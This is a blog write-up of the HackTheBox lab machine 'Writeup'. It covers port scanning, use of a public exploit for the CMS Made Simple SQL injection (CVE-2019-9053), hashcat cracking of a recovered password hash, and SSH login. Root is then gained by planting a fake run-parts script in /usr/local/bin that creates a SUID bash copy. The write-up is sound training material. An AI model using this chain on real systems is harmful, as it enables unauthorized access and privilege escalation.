<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>HackTheBox - Writeup | Ef's log</title>
<meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting">
<meta name=description content="The staff group members can be a root">
<meta name=author content="Fahmi FJ">
<link rel=canonical href=https://fahmifj.github.io/writeups/hackthebox/htb-writeup/>
<meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8">
<link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.b81ef613cf27cff8c756c9b6c965babe14e3c9311c8257e3c724d8f74c73e770.css integrity="sha256-uB72E88nz/jHVsm2yWW6vhTjyTEcglfjxyTY90xz53A=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.741dec98d6b054bccfc6d283634767a9ea1005b131dd1c3bc34014028a2940ba.js integrity="sha256-dB3smNawVLzPxtKDY0dnqeoQBbEx3Rw7w0AUAoopQLo=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.87.0">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="HackTheBox - Writeup">
<meta property="og:description" content="The staff group members can be a root">
<meta property="og:type" content="article">
<meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-writeup/">
<meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538.png"><meta property="article:section" content="writeups">
<meta property="article:published_time" content="2021-08-06T00:04:21+07:00">
<meta property="article:modified_time" content="2021-08-06T00:04:21+07:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538.png">
<meta name=twitter:title content="HackTheBox - Writeup">
<meta name=twitter:description content="The staff group members can be a root">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Writeup","item":"https://fahmifj.github.io/writeups/hackthebox/htb-writeup/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Writeup","name":"HackTheBox - Writeup","description":"The staff group members can be a root","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.\nSkills Learned  Exploiting CMS Made Simple Path Hijack  Tools  Nmap CMS Made Simple Exploit PoC  Reconnaissance Nmap A full tcp scan using nmap discovers two open ports: SSH on port 22 and an Apache web server on port 80.\n→ kali@kali «writeup» «10.10.14.83» $ nmap -p- -oA nmap/10-tcp-allport-writeup 10.10.10.138 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 15:32 EDT Nmap scan report for 10.10.10.138 Host is up (0.052s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 109.90 seconds → kali@kali «writeup» «10.10.14.83» $ nmap -p22,80 -sC -sV -oA nmap/10-tcp-allport-script-writeup 10.10.10.138 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 15:50 EDT Nmap scan report for 10.10.10.138 Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA) | 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA) |_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds nmap also identified a disallowed directory called /writeup/ on the hosted site from a robot.txt file.\nEnumeration TCP 80 - Website Heading to the website, I find an announcement which states that the server has DoS protection. So I will avoid any form of brute-force attack.\n I’ve added the domain name writeup.htb from the email listed above to my /etc/hosts. Poking the site again with domain name doesn’t show any different.\n→ kali@kali «writeup» «10.10.14.83» $ curl -s http://writeup.htb/ | wc -c 3032 → kali@kali «writeup» «10.10.14.83» $ curl -s http://10.10.10.138/ | wc -c 3032 /writeup/ Poking the /writeup/ directory with hostname only shows 5 bytes different, and that’s probably because the URL in the source changed from number to character.\n→ kali@kali «writeup» «10.10.14.83» $ curl -s http://10.10.10.138/writeup/ | wc -c 1556 → kali@kali «writeup» «10.10.14.83» $ curl -s http://writeup.htb/writeup/ | wc -c 1551 The site looks like still WIP.\n On the page source, it shows that the site is generated using CMS Made Simple.\n I found that the index page itself has one parameter called page. Judging from the .php extension and the parameter, the site might be interacting with a database.\n http://10.10.10.138/writeup/index.php?page=writeup  Finding Vulnerabilities Since this is an easy box, I started to look for an exploit on Google. Using the box release date (08 Jun 2019) as a hint, I found some potential exploits.\n Foothold Shell as jkr Unauthenticated SQL Injection on CMS Made Simple The SQL injection vulnerability is classified as CVE-2019-9053, and it doesn’t require authentication. I will be using this poc to exploit this vuln.\nThe exploit found one password hash for user jkr.\n Password Cracking The password can be cracked using hashcat. It recovered to raykayjay9.\n./hashcat.exe -m 20 \"62def4866937f08cc13bab43bb14e6f7:5a599ef579066807\" ../../rockyou.txt -O 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9 Session..........: hashcat Status...........: Cracked Hash.Name........: md5($salt.$pass) SSH - jkr The password work on SSH for user jkr.\n→ kali@kali «exploits» «10.10.14.83» $ ssh jkr@10.10.10.138 jkr@10.10.10.138's password: Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux ...[SNIP]... Last login: Sun Jul 11 08:31:07 2021 from 10.10.14.28 jkr@writeup:~$ id \u0026\u0026 ip a uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev) 1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0:  mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:b9:2d:3a brd ff:ff:ff:ff:ff:ff inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feb9:2d3a/64 scope link valid_lft forever preferred_lft forever The user flag is done here.\njkr@writeup:~$ cat user.txt d4e49...[SNIP]... Privilege Escalation Shell as root Enumeration During process inspection, I noticed that the root user executed the following command, which occurs every time jkr logs in.\nsh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d  /run/motd.dynamic.new  According to the man page of env, the -i flag means the execution starts with an empty environment.\n User jkr is a member of the staff group [source], so it is possible to hijack the run-parts binary since I have write access on /usr/local/.\n If it was too wordy, see the example below.\n The executables under /usr/local/bin/ overrides the ones under /bin.\nPath Hijack I will create a script that copies the bash to /tmp/ under /usr/local/bin/ and I will name it as run-script.\njkr@writeup:/tmp$ echo -e '#!/bin/sh\\ncp /bin/bash /tmp/iamf \u0026\u0026 chmod 4755 /tmp/iamf'  /usr/local/bin/run-parts jkr@writeup:/tmp$ chmod +x /usr/local/bin/run-parts Then, I will I start another SSH login to trigger the script.\n→ kali@kali «exploits» «10.10.14.83» $ ssh jkr@10.10.10.138 jkr@10.10.10.138's password: And my copy of bash is now available in /tmp/. Since it has SUID of root, I can become root by executing the bash using -p flag.\n  Reference(s)  https://www.exploit-db.com/exploits/46635 https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff  ","wordCount":"896","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538.png","datePublished":"2021-08-06T00:04:21+07:00","dateModified":"2021-08-06T00:04:21+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-writeup/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<noscript>
<style type=text/css>#theme-toggle,.top-link{display:none}</style>
</noscript>
<header class="header sticky">
<nav class=nav>
<div class=menu-wrapper>
<div class=logo>
<a href=https://fahmifj.github.io/ accesskey=h title=友人F>友人F</a>
</span>
</div>
<ul id=menu onscroll=menu_on_scroll()>
<li>
<a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/>Search</a>
</li>
<li>
<a href=https://fahmifj.github.io/blog/ title=Blog>Blog</a>
</li>
<li>
<a href=https://fahmifj.github.io/writeups/ title=Writeups>Writeups</a>
</li>
<li>
<a href=https://fahmifj.github.io/projects/ title=Projects>Projects</a>
</li>
<li>
<a href=https://fahmifj.github.io/about/ title=About>About</a>
</li>
</ul>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
HackTheBox - Writeup
</h1>
<div class=post-description>
The staff group members can be a root
</div>
<div class=post-meta>
August 6, 2021&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Fahmi FJ
</div>
</header>
<div class=post-content-wrapper><div class=toc>
<div class=inner><ul>
<li>
<a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul>
<li>
<a href=#nmap aria-label=Nmap>Nmap</a></li></ul>
</li>
<li>
<a href=#enumeration aria-label=Enumeration>Enumeration</a><ul>
<li>
<a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li>
<li>
<a href=#finding-vulnerabilities aria-label="Finding Vulnerabilities">Finding Vulnerabilities</a></li></ul>
</li>
<li>
<a href=#foothold aria-label=Foothold>Foothold</a><ul>
<li>
<a href=#shell-as-jkr aria-label="Shell as jkr">Shell as jkr</a></li></ul>
</li>
<li>
<a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul>
<li>
<a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul>
</li>
<li>
<a href=#references aria-label=Reference(s)>Reference(s)</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content>
<figure class=entry-cover>
<img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538_hub822a67dffaeca7826aa552833fd1af6_136300_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538_hub822a67dffaeca7826aa552833fd1af6_136300_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538_hub822a67dffaeca7826aa552833fd1af6_136300_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538.png 738w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-writeup/imgs/image-20210805233903538.png alt>
</figure><p>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</p>
<h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4>
<ul>
<li>Exploiting CMS Made Simple</li>
<li>Path Hijack</li>
</ul>
<h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4>
<ul>
<li>Nmap</li>
<li><a href=https://www.exploit-db.com/exploits/46635>CMS Made Simple Exploit PoC</a></li>
</ul>
<h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2>
<h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3>
<p>A full tcp scan using <code>nmap</code> discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p- -oA nmap/10-tcp-allport-writeup 10.10.10.138                 
Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-07-11 15:32 EDT
Nmap scan report <span class=k>for</span> 10.10.10.138
Host is up <span class=o>(</span>0.052s latency<span class=o>)</span>.
Not shown: <span class=m>65533</span> filtered ports
PORT   STATE SERVICE
22/tcp  ssh
80/tcp open  http

Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 109.90 seconds
→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p22,80 -sC -sV -oA nmap/10-tcp-allport-script-writeup 10.10.10.138
Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-07-11 15:50 EDT
Nmap scan report <span class=k>for</span> 10.10.10.138
Host is up <span class=o>(</span>0.10s latency<span class=o>)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class=o>(</span>protocol 2.0<span class=o>)</span>
<span class=p>|</span> ssh-hostkey: 
<span class=p>|</span>   <span class=m>2048</span> dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 <span class=o>(</span>RSA<span class=o>)</span>
<span class=p>|</span>   <span class=m>256</span> 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 <span class=o>(</span>ECDSA<span class=o>)</span>
<span class=p>|</span>_  <span class=m>256</span> 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab <span class=o>(</span>ED25519<span class=o>)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class=o>((</span>Debian<span class=o>))</span>
<span class=p>|</span> http-robots.txt: <span class=m>1</span> disallowed entry 
<span class=p>|</span>_/writeup/
<span class=p>|</span>_http-title: Nothing here yet.
Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 11.02 seconds
</code></pre></div><p><code>nmap</code> also identified a disallowed directory called <code>/writeup/</code> on the hosted site from a <code>robot.txt</code> file.</p>
<h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2>
<h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3>
<p>Heading to the website, I find an announcement which states that the server has DoS protection. So I will avoid any form of brute-force attack.</p>
<p><div class=img-container><img src=imgs/image-20210712044500370.png alt=image-20210712044500370></div>
</p>
<p>I&rsquo;ve added the domain name <code>writeup.htb</code> from the email listed above to my <code>/etc/hosts</code>. Poking the site again with domain name doesn&rsquo;t show any different.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/ <span class=p>|</span> wc -c
<span class=m>3032</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/ <span class=p>|</span> wc -c
<span class=m>3032</span>
</code></pre></div><h4 id=writeup>/writeup/<a class=anchor aria-hidden=true href=#writeup>#</a></h4>
<p>Poking the <code>/writeup/</code> directory with hostname only shows 5 bytes different, and that&rsquo;s probably because the URL in the source changed from number to character.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/writeup/ <span class=p>|</span> wc -c
<span class=m>1556</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/writeup/ <span class=p>|</span> wc -c 
<span class=m>1551</span>
</code></pre></div><p>The site looks like still WIP.</p>
<p><div class=img-container><img src=./imgs/image-20210712064012743.png alt=image-20210712064012743></div>
</p>
<p>On the page source, it shows that the site is generated using <a href=http://www.cmsmadesimple.org/>CMS Made Simple</a>.</p>
<p><div class=img-container><img src=./imgs/image-20210712071448079.png alt=image-20210712071448079></div>
</p>
<p>I found that the index page itself has one parameter called <code>page</code>. Judging from the <code>.php</code> extension and the parameter, the site might be interacting with a database.</p>
<ul>
<li>http://10.10.10.138/writeup/index.php?page=writeup</li>
</ul>
<h3 id=finding-vulnerabilities>Finding Vulnerabilities<a class=anchor aria-hidden=true href=#finding-vulnerabilities>#</a></h3>
<p>Since this is an easy box, I started to look for an exploit on Google. Using the box release date (08 Jun 2019) as a hint, I found some potential exploits.</p>
<p><div class=img-container><img src=./imgs/image-20210712071635128.png alt=image-20210712071635128></div>
</p>
<h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2>
<h3 id=shell-as-jkr>Shell as jkr<a class=anchor aria-hidden=true href=#shell-as-jkr>#</a></h3>
<h4 id=unauthenticated-sql-injection-on-cms-made-simple--229>Unauthenticated SQL Injection on CMS Made Simple &lt;= 2.2.9<a class=anchor aria-hidden=true href=#unauthenticated-sql-injection-on-cms-made-simple--229>#</a></h4>
<p>The SQL injection vulnerability is classified as CVE-2019-9053, and it doesn&rsquo;t require authentication. I will be using <a href=https://www.exploit-db.com/exploits/46635>this poc</a> to exploit this vuln.</p>
<p>The exploit found one password hash for user <code>jkr</code>.</p>
<p><div class=img-container><img src=./imgs/image-20210712073023879.png alt></div>
</p>
<h4 id=password-cracking>Password Cracking<a class=anchor aria-hidden=true href=#password-cracking>#</a></h4>
<p>The password can be cracked using <code>hashcat</code>. It recovered to <code>raykayjay9</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>./hashcat.exe -m <span class=m>20</span> <span class=s2>&#34;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&#34;</span> ../../rockyou.txt -O

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5<span class=o>(</span><span class=nv>$salt</span>.<span class=nv>$pass</span><span class=o>)</span>
</code></pre></div><h4 id=ssh---jkr>SSH - jkr<a class=anchor aria-hidden=true href=#ssh---jkr>#</a></h4>
<p>The password work on SSH for user <code>jkr</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138   
jkr@10.10.10.138<span class=err>&#39;</span>s password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

...<span class=o>[</span>SNIP<span class=o>]</span>...

Last login: Sun Jul <span class=m>11</span> 08:31:07 <span class=m>2021</span> from 10.10.14.28
jkr@writeup:~$ id <span class=o>&amp;&amp;</span> ip a
<span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>jkr<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>jkr<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>jkr<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,25<span class=o>(</span>floppy<span class=o>)</span>,29<span class=o>(</span>audio<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,44<span class=o>(</span>video<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,50<span class=o>(</span>staff<span class=o>)</span>,103<span class=o>(</span>netdev<span class=o>)</span>
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=m>1</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc pfifo_fast state UP group default qlen <span class=m>1000</span>
    link/ether 00:50:56:b9:2d:3a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:2d3a/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre></div><p>The user flag is done here.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>jkr@writeup:~$ cat user.txt
d4e49...<span class=o>[</span>SNIP<span class=o>]</span>...
</code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2>
<h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3>
<h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4>
<p>During process inspection, I noticed that the root user executed the following command, which occurs every time <code>jkr</code> logs in.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>sh -c /usr/bin/env -i <span class=nv>PATH</span><span class=o>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
</code></pre></div><p><div class=img-container><img src=imgs/image-20210712081613422.png alt=image-20210712081613422></div>
</p>
<p>According to the <a href=https://man7.org/linux/man-pages/man1/env.1.html>man page</a> of <code>env</code>, the <code>-i</code> flag means the execution starts with an empty environment.</p>
<p><div class=img-container><img src=imgs/image-20210805222545108.png alt=image-20210805222545108></div>
</p>
<p>User <code>jkr</code> is a member of the <code>staff</code> group [<a href=https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff>source</a>], so it is possible to hijack the <code>run-parts</code> binary since I have write access on <code>/usr/local/</code>.</p>
<p><div class=img-container><img src=imgs/image-20210805231326745.png alt=image-20210805231326745></div>
</p>
<p>If it was too wordy, see the example below.</p>
<p><div class=img-container><img src=imgs/image-20210806012111454.png alt=image-20210806012111454></div>
</p>
<p>The executables under <code>/usr/local/bin/</code> overrides the ones under <code>/bin</code>.</p>
<h4 id=path-hijack>Path Hijack<a class=anchor aria-hidden=true href=#path-hijack>#</a></h4>
<p>I will create a script that copies the <code>bash</code> to <code>/tmp/</code> under <code>/usr/local/bin/</code> and I will name it as <code>run-script</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>jkr@writeup:/tmp$ <span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/sh\ncp /bin/bash /tmp/iamf &amp;&amp; chmod 4755 /tmp/iamf&#39;</span> &gt; /usr/local/bin/run-parts
jkr@writeup:/tmp$ chmod +x /usr/local/bin/run-parts
</code></pre></div><p>Then, I will I start another SSH login to trigger the script.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138
jkr@10.10.10.138<span class=err>&#39;</span>s password: 
</code></pre></div><p>And my copy of bash is now available in <code>/tmp/</code>. Since it has SUID of root, I can become root by executing the bash using <code>-p</code> flag.</p>
<p><div class=img-container><img src=imgs/image-20210712082934311.png alt=image-20210712082934311></div>
</p>
<hr>
<h2 id=references>Reference(s)<a class=anchor aria-hidden=true href=#references>#</a></h2>
<ul>
<li><a href=https://www.exploit-db.com/exploits/46635>https://www.exploit-db.com/exploits/46635</a></li>
<li><a href=https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff>https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff</a></li>
</ul>
</div>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li>
<li><a href=https://fahmifj.github.io/tags/cve-2019-9053/>CVE-2019-9053</a></li>
<li><a href=https://fahmifj.github.io/tags/path-hijack/>Path-hijack</a></li>
</ul>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Writeup on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Writeup&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-writeup%2f&hashtags=Linux%2cCVE-2019-9053%2cPath-hijack"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-writeup%2f&title=HackTheBox%20-%20Writeup&summary=HackTheBox%20-%20Writeup&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-writeup%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
